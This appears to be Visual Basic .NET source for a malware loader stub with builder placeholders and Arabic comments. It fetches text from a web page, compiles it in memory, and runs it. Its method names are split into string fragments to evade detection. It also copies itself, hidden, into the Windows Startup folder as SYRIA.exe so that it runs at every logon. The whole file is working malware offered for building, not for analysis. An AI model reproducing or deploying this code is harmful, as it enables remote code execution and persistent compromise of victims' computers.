'Imports System.Reflection
'Imports System.IO
'Imports System.Resources
Imports Microsoft.VisualBasic.CallType
Imports Microsoft.VisualBasic.VBCodeProvider
Imports Microsoft.VisualBasic

''''%ASSEMBLY%<Assembly: System.Reflection.AssemblyTitle("%Title%")>
''''%ASSEMBLY%<Assembly: System.Reflection.AssemblyDescription("%Description%")>
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyCompany("%Company%")> 
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyProduct("%Product%")> 
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyCopyright("%Copyright%")> 
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyTrademark("%Trademark%")> 
'%ASSEMBLY%<Assembly: System.Reflection.AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")> 
'%ASSEMBLY%<Assembly: System.Resources.NeutralResourcesLanguage("ar-SA")>

Namespace sakura
    Public Class Sakura
        Private Shared s As New System.Windows.Forms.WebBrowser()
        Private Shared pussy As String
#Const sup = True
        Public Shared Sub Main()
            s.ScriptErrorsSuppressed = True
            s.Navigate("MONSTERMC")
            AddHandler s.DocumentCompleted, AddressOf s_DocumentCompleted
            Do While Not s.ReadyState = System.Windows.Forms.WebBrowserReadyState.Complete
                System.Windows.Forms.Application.DoEvents()
            Loop
            Run(pussy)

#If sup Then

            gg()
#End If

        End Sub
        Private Shared Sub s_DocumentCompleted(sender As Object, e As System.Windows.Forms.WebBrowserDocumentCompletedEventArgs)
            ' التحقق مما إذا كان التحميل قد اكتمل بشكل كامل
            If e.Url.AbsoluteUri = CType(sender, System.Windows.Forms.WebBrowser).Url.AbsoluteUri Then
                ' إذا كان التحميل قد اكتمل، يمكنك الوصول إلى محتوى الصفحة الحالي
                pussy = s.Document.Body.InnerText

                ' يمكنك استخدام النص الخاص بـ HTML كما تشاء

            End If
        End Sub
        Public Shared Sub Run(ByVal code As String)
            Try
                Dim dic As New System.Collections.Generic.Dictionary(Of String, String)()
                dic.Add("CompilerVersion", "v4.0")
                Dim vbCodeProvider As New VBCodeProvider(dic)
                Dim assemblies As String() = {"Sy" + "stem.Dr" + "awi" + "ng.dll", "Syst" + "em.Mana" + "geme" + "nt.dll", "Sy" + "stem.dll", "Sy" + "stem.Wi" + "ndows.Fo" + "rms.dll", "Microsoft.Vis" + "ualB" + "asic.dll"}

                Dim parameters As New System.CodeDom.Compiler.CompilerParameters(assemblies)
                parameters.GenerateExecutable = False
                parameters.GenerateInMemory = True
                parameters.IncludeDebugInformation = False
                Dim results As System.CodeDom.Compiler.CompilerResults = CallByName(vbCodeProvider, "Compile" & "Assembly" & "From" & "Source", CallType.Method, parameters, code)
                'vbCodeProvider.CompileAssemblyFromSource(parameters, code)

                Dim f As Object = results.CompiledAssembly.GetType("sexy.M" + "ain").GetMethod("Ma" + "in")
                '.Invoke(Nothing, Nothing)
                Dim r As Char = "old"
                Dim n As Char = "vodka"
                CallByName(f, "I" & "n" & n & r & "k" + "e", CallType.Method, Nothing, Nothing)
            Catch ex As System.Exception
                MsgBox(ex.Message)
            End Try

        End Sub
#If sup Then
        Public Shared Sub gg()
            Try


                Dim currentAppPath As String = System.Windows.Forms.Application.ExecutablePath


                ' الحصول على مسار مجلد بداية التشغيل
                Dim startupFolderPath As String = System.Environment.GetFolderPath(System.Environment.SpecialFolder.CommonStartup)

                ' مسار ملف الهدف في مجلد بداية التشغيل
                Dim targetFilePath As String = System.IO.Path.Combine(startupFolderPath, "SYRIA" & ".exe")

                ' نسخ التطبيق إلى مجلد بداية التشغيل إذا لم يكن موجودًا بالفعل
                If Not System.IO.File.Exists(targetFilePath) Then

                    System.IO.File.Copy(currentAppPath, targetFilePath)
                    System.IO.File.SetAttributes(targetFilePath, System.IO.FileAttributes.Hidden)

                End If
            Catch


            End Try
        End Sub
#End If
    End Class
End Namespace